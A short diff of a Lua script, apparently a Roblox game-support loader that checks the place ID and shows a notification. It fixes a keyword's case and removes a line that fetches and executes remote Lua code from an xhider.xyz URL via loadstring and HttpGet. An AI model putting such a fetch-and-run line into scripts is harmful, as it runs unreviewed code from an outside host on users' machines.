@@ -1,4 +1,4 @@
-Local PlaceId = game.PlaceId
+local PlaceId = game.PlaceId
 
 -- Danh sách các game hỗ trợ
 local Games = {
@@ -16,4 +16,3 @@ else
         Duration = 6
     })
 end
-Thay script THROW thành script này loadstring(game:HttpGet("https://api.xhider.xyz/files/v4/loaders/e9a862a665e0339d8bc4059a480ad322.lua"))()
